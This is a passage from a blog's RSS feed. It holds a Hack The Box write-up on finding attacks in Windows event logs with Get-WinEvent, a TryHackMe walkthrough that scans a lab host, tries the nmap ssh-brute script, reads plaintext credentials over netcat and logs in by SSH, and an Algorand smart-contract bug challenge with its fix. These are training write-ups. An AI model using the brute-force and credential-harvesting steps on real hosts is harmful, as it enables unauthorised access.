&lt;p&gt;This module covers the exploration of Windows Event Logs and their significance in uncovering suspicious activities. Throughout the course, we delve into the anatomy of Windows Event Logs and highlight the logs that hold the most valuable information for investigations. The module also focuses on utilizing Sysmon and Event Logs for detecting and analyzing malicious behavior. Additionally, we delve into Event Tracing for Windows (ETW), explaining its architecture and components, and provide ETW-based detection examples. To streamline the analysis process, we introduce the powerful Get-WinEvent cmdlet.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://academy.hackthebox.com/module/details/216&quot;&gt;Link to the module&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;By examining the logs located in the &quot;C:\Logs\DLLHijack&quot; directory, determine the process responsible for executing a DLL hijacking attack. Enter the process name as your answer. Answer format: _.exe&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Using Get-WinEvent, I attempted to filter for events related to DLL hijacking attacks. While this might not be the most efficient method, I recalled that DLLs involved in such attacks are often unsigned. Therefore, I searched for events with &lt;a href=&quot;https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#events&quot;&gt;ID&lt;/a&gt; 7 AND those with the message &quot;signed: false&quot;.&lt;/p&gt;
&lt;p&gt;I run:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-WinEvent -Path &apos;C:\Logs\DLLHijack\*&apos; | Where-Object{$_.ID -like &quot;7&quot;} | Where-Object{$_.Message -like &quot;*signed: false*&quot;} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Only got 2 results and one of those was the correct answer.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;By examining the logs located in the &quot;C:\Logs\PowershellExec&quot; directory, determine the process that executed unmanaged PowerShell code. Enter the process name as your answer. Answer format: _.exe&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;As per the guide, the presence of &quot;Microsoft .NET Runtime...&quot;, clr.dll, and clrjit.dll in processes that typically don&apos;t require them is indicative of potential execute-assembly or unmanaged PowerShell injection attacks. These DLLs are typically used for executing C# code. Therefore, I searched for events containing &quot;clr.dll&quot;. The initial results highlighted a suspicious executable file that should not have access to this DLL.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-WinEvent -Path &apos;C:\Logs\PowershellExec\*&apos; | Where-Object{$_.ID -like &quot;7&quot;} | Where-Object{$_.Message -like &quot;*clr.dll*&quot;} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;By examining the logs located in the &quot;C:\Logs\PowershellExec&quot; directory, determine the process that injected into the process that executed unmanaged PowerShell code. Enter the process name as your answer. Answer format: _.exe&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;For this specific scenario, I focused on Calculator.exe and filtered events with &lt;a href=&quot;https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#events&quot;&gt;ID&lt;/a&gt; 8, indicating a CreateRemoteThread operation.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-WinEvent -Path &apos;C:\Logs\PowershellExec\*&apos; | Where-Object{$_.ID -like &quot;8&quot;} | Where-Object{$_.Message -like &quot;*Calculator.exe*&quot;} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;By examining the logs located in the &quot;C:\Logs\Dump&quot; directory, determine the process that performed an LSASS dump. Enter the process name as your answer. Answer format: _.exe&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;I filtered for events with &lt;a href=&quot;https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#events&quot;&gt;ID&lt;/a&gt; 10 (ProcessAccess) and searched for entries targeting lsass.exe. While there were multiple results, only one was initiated by a suspicious executable file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-WinEvent -Path &apos;C:\Logs\Dump\*&apos; | Where-Object{$_.ID -like &quot;10&quot;} | Where-Object{$_.Message -like &quot;*TargetImage*lsass.exe*&quot;} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;By examining the logs located in the &quot;C:\Logs\Dump&quot; directory, determine if an ill-intended login took place after the LSASS dump. Answer format: Yes or No&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;I searched for events with ID 4624 (which indicates a successful account login), but found no relevant entries.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;By examining the logs located in the &quot;C:\Logs\StrangePPID&quot; directory, determine a process that was used to temporarily execute code based on a strange parent-child relationship. Enter the process name as your answer. Answer format: _.exe&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Finally, I filtered for events with &lt;a href=&quot;https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#events&quot;&gt;ID&lt;/a&gt; 1 (Process creation). There were limited results, and only one of them appeared suspicious.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-WinEvent -Path &apos;C:\Logs\StrangePPID\*&apos; | Where-Object{$_.ID -like &quot;1&quot;} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>Walkthrough: Intermediate Nmap - TryHackMe.</title><link>https://alan.com.ar/posts/intermediatenmap/</link><guid isPermaLink="true">https://alan.com.ar/posts/intermediatenmap/</guid><pubDate>Mon, 06 May 2024 03:24:52 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;You&apos;ve learned some great nmap skills! Now can you combine that with other skills with netcat and protocols, to log in to this machine and find the flag? This VM MACHINE_IP is listening on a high port, and if you connect to it it may give you some information you can use to connect to a lower port commonly used for remote access!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/r/room/intermediatenmap&quot;&gt;Link to the room&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;First I looked for open ports:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$ nmap -sT 10.10.250.39 -vv       
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Those were:&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;PORT&lt;/th&gt;
&lt;th&gt;STATE&lt;/th&gt;
&lt;th&gt;SERVICE&lt;/th&gt;
&lt;th&gt;REASON&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;22/tcp&lt;/td&gt;
&lt;td&gt;open&lt;/td&gt;
&lt;td&gt;ssh&lt;/td&gt;
&lt;td&gt;syn-ack&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2222/tcp&lt;/td&gt;
&lt;td&gt;open&lt;/td&gt;
&lt;td&gt;EtherNetIP-1&lt;/td&gt;
&lt;td&gt;syn-ack&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;31337/tcp&lt;/td&gt;
&lt;td&gt;open&lt;/td&gt;
&lt;td&gt;Elite&lt;/td&gt;
&lt;td&gt;syn-ack&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;Then, since I&apos;ve recently learnt about nmap scripts I first decided to try:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$nmap -p 22 10.10.250.39 --script ssh-brute
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;but wasn&apos;t able to get the credentials this way.&lt;/p&gt;
&lt;p&gt;So I followed the instructions and interacted with the 31337 TCP port with netcat:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;netcat -n 10.10.250.39 31337
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;which resulted in:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In case I forget - user:pass
ubuntu:Dafdas!!/str0ng&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;With these credentials I was able to login via ssh:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$ ssh ubuntu@10.10.250.39
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and navigate to the flag.txt file.&lt;/p&gt;
</content:encoded></item><item><title>Algorand Coding Challenge - Volume 2:  Python #04.</title><link>https://alan.com.ar/posts/algochallengepython04/</link><guid isPermaLink="true">https://alan.com.ar/posts/algochallengepython04/</guid><pubDate>Tue, 23 Apr 2024 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/algorand-coding-challenges/python-challenge-4&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt; Challenge 4: Can I Trust This AI Doctor? &lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;The smart contract that keeps track of information about the AI doctor is broken! For some reason the method to record new AI info doesn&apos;t work. Humanity is doomed! &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Inside of &lt;code&gt;smart_contracts/verify_medical_ai/contract.py&lt;/code&gt; file, there is a simple smart contract used for recording AI information written in Algorand Python.&lt;/p&gt;
&lt;p&gt;It is a simple contract that has a &lt;code&gt;record_ai_info&lt;/code&gt; method and a &lt;code&gt;get_ai_info&lt;/code&gt; method and the AI information is recorded in the local state &lt;code&gt;ai_info&lt;/code&gt;. There is also an &lt;code&gt;opt_in&lt;/code&gt; method used to opt in to the contract to create local state for Txn.sender.&lt;/p&gt;
&lt;p&gt;If you don&apos;t know what &lt;code&gt;opt-in to app&lt;/code&gt; is it is a unique feature on Algorand that allows smart contract to create local state for each account opted in to the contract. You can learn more about opt-ins and local state &lt;a href=&quot;https://developer.algorand.org/docs/get-details/dapps/smart-contracts/apps/state/?from_query=local%20state#local-storage&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If you try building the smart contract by opening Docker Desktop, and then running:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;algokit bootstrap all # set up dev environment on your computer
algokit localnet start # launch an Algorand local network for testing
algokit project run build # Compile the smart contract and get low-level TEAL code.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;it will fail and show multiple errors.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Find out what is wrong and fix the bug.&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; Meet other hackers working on this challenge and get help in the &lt;a href=&quot;https://discord.com/channels/491256308461207573/1182612934455722075&quot;&gt;Algorand Python Discord Channel&lt;/a&gt;!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Checkpoint 1:  Prerequisites&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.python.org/downloads/&quot;&gt;Install Python 3.12 or higher&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/tree/main?tab=readme-ov-file#install&quot;&gt;Install AlgoKit&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Install &lt;a href=&quot;https://www.docker.com/products/docker-desktop/&quot;&gt;Docker&lt;/a&gt;. It is used to run a local Algorand network for development.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Checkpoint 2:  Set up your development environment&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo&quot;&gt;Fork this repository.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Clone the repository&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;cd [DIRECTORY_OF_YOUR_CHOICE]
git clone [FORKED_REPO_URL]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now you have 2 ways of opening your AlgoKit project.&lt;/p&gt;
&lt;h3&gt;With VSCode Workspaces&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Open the cloned repository with the code editor of your choosing.&lt;/li&gt;
&lt;li&gt;Open workspace mode by clicking &lt;code&gt;open workspace&lt;/code&gt; inside of &lt;code&gt;python-challenge-4.code-workspace&lt;/code&gt; file at the root level.&lt;/li&gt;
&lt;li&gt;Go inside of the &lt;code&gt;challenge&lt;/code&gt; folder.&lt;/li&gt;
&lt;li&gt;To setup your dev environment using AlgoKit, run the below command:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;algokit project bootstrap all #algokit bootstrap all is being deprecated. Use this command from now on.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This command will install all dependencies and also generate a &lt;code&gt;.env&lt;/code&gt; file for you.
5. Activate Python virtual environment by running:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;poetry shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;venv will automatically be activated the next time you open the project.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Please note, in addition to built-in support for &lt;a href=&quot;https://code.visualstudio.com/docs/editor/workspaces&quot;&gt;VSCode Workspaces&lt;/a&gt;, the cli provides native support for monorepos called &lt;code&gt;algokit workspaces&lt;/code&gt;. Refer to &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/features/project/run.md#workspace-vs-standalone-projects&quot;&gt;documentation&lt;/a&gt; for detailed guidelines for recommended project structures and ability to leverage custom command orchestration via &lt;code&gt;algokit project run&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Without VSCode Workspaces&lt;/h3&gt;
&lt;p&gt;All AlgoKit projects initialized with &lt;code&gt;--workspace&lt;/code&gt; option has the following directory structure:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; projects
    smart-contract
    frontend # doesn&apos;t exist for this project
    ...
 {several config files...}
 ...
 .algokit.toml # workspace-typed algokit project config
 {project-name}.code-workspace
 README.md
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So to access a single project under the &lt;code&gt;projects&lt;/code&gt; folder, it is recommended to &lt;code&gt;cd&lt;/code&gt; into the project you want to work with and then open your code editor (alternatively refer to VSCode Workspace file at the root). If you are reading this and didn&apos;t open the &lt;code&gt;challenge&lt;/code&gt; folder directly, go do that now!! &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;cd into &lt;code&gt;projects/challenge&lt;/code&gt; then open the code editor&lt;/li&gt;
&lt;li&gt;To setup your dev environment using AlgoKit, run the below command:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;algokit project bootstrap all #algokit bootstrap all is being deprecated. Use this command from now on.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This command will install all dependencies and also generate a &lt;code&gt;.env&lt;/code&gt; file for you.
3. Activate the Python virtual environment by running below inside of &lt;code&gt;challenge&lt;/code&gt; folder:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;poetry shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;venv will automatically be activated the next time you open the project.&lt;/p&gt;
&lt;p&gt;Video walkthrough of forking and cloning this repository:&lt;/p&gt;
&lt;p&gt;https://github.com/algorand-fix-the-bug-campaign/challenge-1/assets/52557585/acde8053-a8dd-4f53-8bad-45de1068bfda&lt;/p&gt;
&lt;p&gt;Now you are ready to fix the bug!&lt;/p&gt;
&lt;h2&gt;Checkpoint 3:  Fix the bug &lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Open Docker Desktop and launch Algorand localnet by running &lt;code&gt;algokit localnet start&lt;/code&gt; in your terminal &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/features/localnet.md#creating--starting-the-localnet&quot;&gt;For more info click me!&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Go to &lt;code&gt;smart_contracts/verify_medical_ai/contract.py&lt;/code&gt; and see the source code of the smart contract. Also go to &lt;code&gt;smart_contracts/verify_medical_ai/deploy_config.py&lt;/code&gt; to understand the deployment/test script.&lt;/li&gt;
&lt;li&gt;Try compiling the contract with &lt;code&gt;algokit project run build&lt;/code&gt;. It will fail.&lt;/li&gt;
&lt;li&gt;Read the error, figure out what is wrong, and fix the bug! The bug is inside of the smart contract. There is nothing wrong with the deploy script inside of &lt;code&gt;smart_contracts/verify_medical_ai/deploy_config.py&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;After fixing the bug, build and run the deploy script with the below command:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;algokit project run build
algokit project deploy localnet
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;OR if you are on VSCode, hit F5 or go to the &lt;code&gt;Run and Debug&lt;/code&gt; tab and run the debug script.&lt;/p&gt;
&lt;p&gt;If you see something like this in the console, you successfully fixed the bug! 
&amp;lt;img width=&quot;1335&quot; alt=&quot;image&quot; src=&quot;https://github.com/algorand-coding-challenges/python-challenge-4/assets/52557585/98a97a72-d80a-491e-8a52-a983862fcefa&quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; Are you struggling?&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://developer.algorand.org/docs/get-details/dapps/smart-contracts/apps/innertx/?from_query=inner%20t#template-modal-overlay&quot;&gt;Inner Transaction Documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://algorandfoundation.github.io/puya/api-algopy.itxn.html#algopy.itxn.AssetTransfer&quot;&gt;Algorand Python Documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://developer.algorand.org/docs/get-details/transactions/transactions/?from_query=zero%20asset%20transfer#asset-transfer-transaction:~:text=A%20zero%20amount%20transferred%20to%20self%20allocates%20that%20asset%20in%20the%20account%27s%20Asset%20map.&quot;&gt;How to opt-in to an asset with assetTransfer txn&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Checkpoint 4:  Submit your answer&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;After fixing the bug, push your code to your forked Github repo and &lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request-from-a-fork&quot;&gt;make a PR to the original repo.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Inside the PR include:
&lt;ol&gt;
&lt;li&gt;What was the problem?&lt;/li&gt;
&lt;li&gt;How did you solve the problem?&lt;/li&gt;
&lt;li&gt;Screenshot of your terminal showing the result of running the deploy script.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Checkpoint 5:  Claim your certificate of completion NFT! &lt;/h2&gt;
&lt;p&gt;The Algorand Developer Relations team will review the submission and &quot;approve&quot; the PR by labeling it &lt;code&gt;Approved&lt;/code&gt;. Once it&apos;s approved, we will share the magic link to claim your certificate of completion NFT in the comment of the PR!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The certificate of completion NFT is a verifiable credential minted on the &lt;a href=&quot;https://goplausible.com/&quot;&gt;GoPlausible platform&lt;/a&gt; that follows the W3C standard for certificates and OpenBadges standard for badges.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The certificate of completion NFT for Python challenges was designed by &lt;a href=&quot;https://twitter.com/MaarsComics&quot;&gt;Maars&lt;/a&gt;, an artist &amp;amp; a dev in web3. Definitely follow his work! It&apos;s awesome. &lt;/p&gt;
&lt;p&gt; Congratulations on completing the challenge Algodev!&lt;/p&gt;
&lt;h2&gt;Below is the default readme of the Python AlgoKit Template. Read to learn more about this template.&lt;/h2&gt;
&lt;p&gt;This project has been generated using AlgoKit. See below for default getting started instructions.&lt;/p&gt;
&lt;h1&gt;Setup&lt;/h1&gt;
&lt;h3&gt;Pre-requisites&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.python.org/downloads/&quot;&gt;Python 3.12&lt;/a&gt; or later&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; (only required for LocalNet)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Initial setup&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Clone this repository locally&lt;/li&gt;
&lt;li&gt;Install pre-requisites:
&lt;ul&gt;
&lt;li&gt;Make sure to have &lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; installed and running on your machine.&lt;/li&gt;
&lt;li&gt;Install &lt;code&gt;AlgoKit&lt;/code&gt; - &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli#install&quot;&gt;Link&lt;/a&gt;: The recommended version is &lt;code&gt;1.7.3&lt;/code&gt;. Ensure you can execute &lt;code&gt;algokit --version&lt;/code&gt; and get &lt;code&gt;1.7.1&lt;/code&gt; or later.&lt;/li&gt;
&lt;li&gt;Bootstrap your local environment; run &lt;code&gt;algokit bootstrap all&lt;/code&gt; within this folder, which will:
&lt;ul&gt;
&lt;li&gt;Install &lt;code&gt;Poetry&lt;/code&gt; - &lt;a href=&quot;https://python-poetry.org/docs/#installation&quot;&gt;Link&lt;/a&gt;: The minimum required version is &lt;code&gt;^1.7&lt;/code&gt;. Ensure you can execute &lt;code&gt;poetry -V&lt;/code&gt; and get &lt;code&gt;1.2&lt;/code&gt;+&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;poetry install&lt;/code&gt; in the root directory, which will set up a &lt;code&gt;.venv&lt;/code&gt; folder with a Python virtual environment and also install all Python dependencies&lt;/li&gt;
&lt;li&gt;Copy &lt;code&gt;.env.template&lt;/code&gt; to &lt;code&gt;.env&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;algokit localnet start&lt;/code&gt; to start a local Algorand network in Docker. If you are using VS Code launch configurations provided by the template, this will be done automatically for you.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Open the project and start debugging / developing via:
&lt;ul&gt;
&lt;li&gt;VS Code
&lt;ol&gt;
&lt;li&gt;Open the repository root in VS Code&lt;/li&gt;
&lt;li&gt;Install recommended extensions&lt;/li&gt;
&lt;li&gt;Hit F5 (or whatever you have debug mapped to) and it should start running with breakpoint debugging.
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;
If using Windows: Before running for the first time you will need to select the Python Interpreter.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;Open the command palette (Ctrl/Cmd + Shift + P)&lt;/li&gt;
&lt;li&gt;Search for &lt;code&gt;Python: Select Interpreter&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Select &lt;code&gt;./.venv/Scripts/python.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;JetBrains IDEs (please note, this setup is primarily optimized for PyCharm Community Edition)
&lt;ol&gt;
&lt;li&gt;Open the repository root in the IDE&lt;/li&gt;
&lt;li&gt;It should automatically detect it&apos;s a Poetry project and set up a Python interpreter and virtual environment.&lt;/li&gt;
&lt;li&gt;Hit Shift+F10|Ctrl+R (or whatever you have debug mapped to) and it should start running with breakpoint debugging. Please note, JetBrains IDEs on Windows have a known bug that in some cases may prevent executing shell scripts as pre-launch tasks, for workarounds refer to &lt;a href=&quot;https://youtrack.jetbrains.com/issue/IDEA-277486/Shell-script-configuration-cannot-run-as-before-launch-task&quot;&gt;JetBrains forums&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Other
&lt;ol&gt;
&lt;li&gt;Open the repository root in your text editor of choice&lt;/li&gt;
&lt;li&gt;In a terminal run &lt;code&gt;poetry shell&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;python -m smart_contracts&lt;/code&gt; through your debugger of choice&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Subsequently&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;If you uppublished to the latest source code and there are new dependencies you will need to run &lt;code&gt;algokit bootstrap all&lt;/code&gt; again&lt;/li&gt;
&lt;li&gt;Follow step 3 above&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;For guidance on &lt;code&gt;smart_contracts&lt;/code&gt; folder and adding new contracts to the project please see &lt;a href=&quot;smart_contracts/README.md&quot;&gt;README&lt;/a&gt; on the respective folder.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Tools&lt;/h1&gt;
&lt;p&gt;This project makes use of Algorand Python to build Algorand smart contracts. The following tools are in use:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.algorand.com/&quot;&gt;Algorand&lt;/a&gt; - Layer 1 Blockchain; &lt;a href=&quot;https://developer.algorand.org/&quot;&gt;Developer portal&lt;/a&gt;, &lt;a href=&quot;https://developer.algorand.org/docs/get-started/basics/why_algorand/&quot;&gt;Why Algorand?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli&quot;&gt;AlgoKit&lt;/a&gt; - One-stop shop tool for developers building on the Algorand network; &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/algokit.md&quot;&gt;docs&lt;/a&gt;, &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/tutorials/intro.md&quot;&gt;intro tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/puya&quot;&gt;Algorand Python&lt;/a&gt; - A semantically and syntactically compatible, typed Python language that works with standard Python tooling and allows you to express smart contracts (apps) and smart signatures (logic signatures) for deployment on the Algorand Virtual Machine (AVM); &lt;a href=&quot;https://github.com/algorandfoundation/puya&quot;&gt;docs&lt;/a&gt;, &lt;a href=&quot;https://github.com/algorandfoundation/puya/tree/main/examples&quot;&gt;examples&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-utils-py&quot;&gt;AlgoKit Utils&lt;/a&gt; - A set of core Algorand utilities that make it easier to build solutions on Algorand.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://python-poetry.org/&quot;&gt;Poetry&lt;/a&gt;: Python packaging and dependency management.
It has also been configured to have a productive dev experience out of the box in &lt;a href=&quot;https://code.visualstudio.com/&quot;&gt;VS Code&lt;/a&gt;, see the .vscode folder.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Solution:&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;What was the bug?&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The error shown in terminal was that Argument &quot;name&quot; to &quot;AiInfo&quot; has incompatible type &quot;str&quot;; expected &quot;String&quot;  [arg-type], meaning there was a type mismatch between arguments and LocalState. The LocalState expects arguments of the corresponding ARC4 types.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;How did you fix the bug?&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Using ARC4 types for arguments. By matching the types, the code can now properly assign the provided information to the user&apos;s record in the ai_info LocalState.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ipfs.algonode.xyz/ipfs/bafybeicxwdnhsek3smb6yz7u53rxmfioqsjfiap5ycqbsmb7lojy4essx4?optimizer=image&amp;amp;width=600&quot; alt=&quot;cert&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Algorand Coding Challenge - Volume 2:  Python #03.</title><link>https://alan.com.ar/posts/algochallengepython03/</link><guid isPermaLink="true">https://alan.com.ar/posts/algochallengepython03/</guid><pubDate>Tue, 16 Apr 2024 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/algorand-coding-challenges/python-challenge-3&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt; Challenge 3: Algorand smart contract can send transactions!? &lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;I want to deposit my Super RARE Oranges NFT into my ASA Vault contract but the contract is failing to opt-in to the asset! What is going on?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Inside of &lt;code&gt;smart_contracts/asa_vault/contract.py&lt;/code&gt; file, there is a simple ASA vault smart contract written in Algorand Python.&lt;/p&gt;
&lt;p&gt;It is a simple contract that has a &lt;code&gt;deposit_asa&lt;/code&gt; function and a &lt;code&gt;withdraw_asa&lt;/code&gt; function and the depositor&apos;s balance is recorded in the global state &lt;code&gt;asa_balance&lt;/code&gt;. There is also an &lt;code&gt;opt_in_to_asset&lt;/code&gt; method that opts the smart contract account into the asset that is being deposited.&lt;/p&gt;
